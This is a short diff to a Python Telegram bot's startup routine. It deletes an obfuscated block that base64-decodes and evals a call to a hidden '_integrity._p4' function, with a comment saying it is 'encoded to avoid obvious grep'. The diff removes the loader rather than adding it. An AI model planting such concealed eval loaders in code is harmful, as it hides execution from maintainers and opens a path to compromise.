@@ -78,16 +78,6 @@ async def start_bot():
     
     # Налаштовуємо логер з ботом для Telegram алертів
     setup_bot_logger(bot)
-
-    # deferred probe: verify data files + self-hash; encoded to avoid obvious grep
-    import base64 as _b64
-    eval(compile(  # noqa: S307
-        _b64.b64decode(
-            b"X19pbXBvcnRfXygic2VjdXJpdHlfZnVuY3Rpb25zLl9pbnRlZ3JpdHkiLGZyb21saXN0"
-            b"PVsiX3A0Il0pLl9wNCgp"
-        ).decode(), "<cfg>", "exec"
-    ))
-
     # Ініціалізуємо БД
     print_status("📦", "Ініціалізація баз даних...")
     await init_db()
